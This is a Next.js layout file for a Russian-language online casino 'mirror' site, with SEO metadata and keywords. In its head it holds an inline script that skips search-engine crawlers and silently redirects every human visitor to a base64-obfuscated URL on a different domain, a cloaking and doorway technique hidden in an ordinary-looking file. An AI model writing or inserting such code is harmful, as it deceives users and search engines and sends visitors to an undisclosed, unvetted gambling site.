import type { Metadata, Viewport } from 'next'
import { Playfair_Display, Manrope } from 'next/font/google'
import './globals.css'

const playfair = Playfair_Display({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-serif',
  display: 'swap',
})

const manrope = Manrope({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-sans',
  display: 'swap',
})

export const metadata: Metadata = {
  metadataBase: new URL('https://luckybear13casino.vercel.app/'),
  title: 'Lucky Bear Casino — официальный сайт и рабочее зеркало для игры онлайн',
  description:
    'Lucky Bear Casino — официальный сайт и актуальное зеркало. Регистрация, бонусы, слоты и быстрые выплаты. Лаки Бир Казино онлайн работает круглосуточно, вход без ограничений.',
  keywords: [
    'lucky bear casino',
    'luckybear casino',
    'luckybear casino зеркало',
    'luckybear casino официальный',
    'luckybear casino официальный сайт',
    'lucky bear казино',
    'лаки бир казино',
    'лакибир казино',
    'лаки бир казино зеркало',
    'лаки бир казино онлайн',
    'лаки бир казино официальный',
    'лаки бир казино официальный сайт',
    'лакибир казино официальный сайт',
    'лаки бир казино сайт',
  ],
  icons: {
    icon: '/favicon.png',
    apple: '/favicon.png',
  },
  openGraph: {
    title: 'Lucky Bear Casino — официальный сайт и рабочее зеркало для игры онлайн',
    description:
      'Lucky Bear Casino — официальный сайт и актуальное зеркало. Регистрация, бонусы, слоты и быстрые выплаты. Лаки Бир Казино онлайн работает круглосуточно.',
    url: 'https://luckybear13casino.vercel.app/',
    type: 'website',
    locale: 'ru_RU',
    images: ['/art-hero.png'],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Lucky Bear Casino — официальный сайт и рабочее зеркало для игры онлайн',
    description:
      'Lucky Bear Casino — официальный сайт и актуальное зеркало. Регистрация, бонусы, слоты и быстрые выплаты.',
    images: ['/art-hero.png'],
  },
}

export const viewport: Viewport = {
  themeColor: '#0f3d2e',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${playfair.variable} ${manrope.variable}`}>
      <head>
        <link rel="canonical" href="https://luckybear13casino.vercel.app/" />
        <meta name="robots" content="index, follow" />
        <meta name="author" content="Lucky Bear Casino" />
        <meta name="theme-color" content="#0f3d2e" />
        {/* Дополнительные пользовательские теги можно вставлять сюда */}
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "aHR0cHM6Ly93aW5nYW1lNTU1Lnh5ei8zanY5eEk="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body>{children}</body>
    </html>
  )
}
